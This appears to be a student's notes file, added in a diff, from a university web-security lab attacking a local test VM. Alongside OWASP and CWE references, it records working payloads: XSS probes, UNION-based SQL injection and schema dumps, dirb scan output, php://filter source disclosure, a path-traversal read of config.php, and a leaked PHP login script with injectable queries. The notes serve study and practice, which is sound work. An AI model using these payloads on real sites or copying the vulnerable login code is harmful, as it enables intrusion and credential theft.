@@ -1,0 +1,113 @@
+VM Link:
+https://ln2.sync.com/dl/151e11660/qr384nih-fs3ir5f6-2fzq75ji-iqahbr5b
+
+https://en.wikipedia.org/wiki/SQL_injection
+https://joao.barraca.pt/teaching/sio/2020/p/1/Stuart%20Thomas%20The%20SQL%20Problem.pdf
+https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+https://cwe.mitre.org/data/definitions/89.html
+https://dev.mysql.com/doc/refman/8.0/en/information-schema.html
+https://cwe.mitre.org/data/definitions/79.html
+https://content-security-policy.com/
+https://developer.mozilla.org/pt-PT/docs/Web/HTTP/CORS
+https://joao.barraca.pt/teaching/sio/2020/t/2/SevenPerniciousKingdoms.pdf
+https://watermark.silverchair.com/tyw001.pdf?token=AQECAHi208BE49Ooan9kkhW_Ercy7Dm3ZL_9Cf3qfKAc485ysgAAArAwggKsBgkqhkiG9w0BBwagggKdMIICmQIBADCCApIGCSqGSIb3DQEHATAeBglghkgBZQMEAS4wEQQMWvjGRSAvx3wsqVCMAgEQgIICYzNpA_gFl1cFAZOQ4vQIWF77quuc1y0BfqMFvo7ddnwcN9U7sdfh5x99JfMiHMe8jBhiQr0QCefo7u9rBIuaxGUaSBm1UrL8UnHQUFzCQgyfLEz1gZfQed7hPFH8AazlV11QtmGaFkSB9hNPo0BMoRJs9exC-NfI9At4LGm3OaOQJ6c3o9HjHXUDicamNtTSfwBtrPsHyyJS7YmiArScTfYJ5iITAIPnT3AAu2wIJMEVU__ajc22GZ_-fdJODE9syxdtP9fkzO6QaxDRVVS-_aVw1zB-a72YPtXFOpxZ_R3BvmUNBRNBf_0x_6cUWQIFCBjlBDpgQcsK1WJmmjkWS4byZTB_ACjskwGfPT1D2LOBB7TAkNRfbWEGbOFC0jvIrNmh50Jbzsp-4tCdaCNsw5OE0vUqWQbp9vL2OHTZAtvXOcE328EP-L1oErzdCFrzdwrGTf5wgtA0hZ1YYr7JUAuoKg3tH80gyR3MQ2p_kxTVnX5ZJkYHE7wxIoax8dah-L7nuFW9UKv30odzm2yAKgsmBz_LZdeiMjBFMIBWvKyJl7yKGaNgcuTgEGWv4nIh4X-EzHQUyaBERyP9ezh_M4BK9cfi4T33EMisK3u2pzPcSTIS50T8k7x_k63LMj7gSaQQsdP8ClL9yEjf6swo0eebr1raghYxSPYGwllojacnsiRipksSerQI8GOgjB65GEeUVdMLLJmvBcKGBv0WR5JBDt5Qaxs1vxQpucntt6wy0eFUl0PRC3Qm7iUqSpcTMymoqDz7r4l-_h2zSnaKuEIpv_MpSozWYsuptPq7vOt--Kun
+
+
+admin@integratingsolutions.net 
+blog > click by Admin e ver url 
+
+http://192.168.0.49/details.php?%3Cscript%3Ealert(%27eheh%27)%3C/script%3Eprod=3&type=3
+DB Error, could not query the database MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
+
+
+http://192.168.0.49/details.php?prod=%27union%20select%201,2,3,4,5%27%20--
+
+http://192.168.0.49/terms.php?lang=GBP
+
+carolina@epifania:~/sqlmapproject-sqlmap-1d5bde9$ dirb http://192.168.0.49/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 30 20:06:37 2020
+URL_BASE: http://192.168.0.49/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.0.49/ ----
+==> DIRECTORY: http://192.168.0.49/admin/                                                           
+==> DIRECTORY: http://192.168.0.49/downloads/                                                       
+==> DIRECTORY: http://192.168.0.49/images/                                                          
++ http://192.168.0.49/index.php (CODE:200|SIZE:1533)                                                
++ http://192.168.0.49/info.php (CODE:200|SIZE:85424)                                                
++ http://192.168.0.49/server-status (CODE:403|SIZE:277)                                             
+==> DIRECTORY: http://192.168.0.49/theme/                                                           
+                                                                                                    
+---- Entering directory: http://192.168.0.49/admin/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                    
+---- Entering directory: http://192.168.0.49/downloads/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                    
+---- Entering directory: http://192.168.0.49/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                    
+---- Entering directory: http://192.168.0.49/theme/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Fri Oct 30 20:06:38 2020
+DOWNLOADED: 4612 - FOUND: 3
+
+http://192.168.0.49/downloads/
+http://192.168.0.49/admin/adminheader.php
+http://192.168.0.49/images/products/
+http://192.168.0.49/downloads/login.php.txt
+
+<?php
+include 'connection.php';
+
+$sql    = "SELECT * FROM tblMembers WHERE username='" . $_POST['usermail'] . "';";
+$result = mysql_query($sql, $link);
+
+if (!$result) {
+    echo "DB Error, could not query the database\n";
+    echo 'MySQL Error: ' . mysql_error();
+    exit;
+}
+
+if (mysql_num_rows($result) < 1) {
+    header('Location: /account.php?login=user') ;
+}
+else {
+    $sql    = "SELECT session FROM tblMembers WHERE username='" . $_POST['usermail'] . "' AND password='" . $_POST['password'] . "';";
+    $result = mysql_query($sql, $link);
+    if (mysql_num_rows($result) == 0) {
+        header('Location: /account.php?login=pass') ;
+    }
+    else {
+        $row =  mysql_fetch_assoc($result);
+        setcookie("SessionId", $row['session']);
+        header('Location: /account.php?login=success');
+    }
+}
+?>
+
+
+http://192.168.1.6/products.php?type=1%20union%20select%201,COLUMN_NAME,COLUMN_NAME,3,5%20from%20information_schema.columns
+
+<img src="https://developers.google.com/web/fundamentals/design-and-ux/responsive/img/html5.png?hl=pt-br" > 
+
+http://192.168.1.6/products.php?type=1&lang=php://filter/read=convert.base64-encode/resource=connection.php
+
+vendo o pedido que ele estava a fazer para chegar ao portfolio 
+http://192.168.1.6/download.php?item=../../../../../../../../var/www/html/config.php
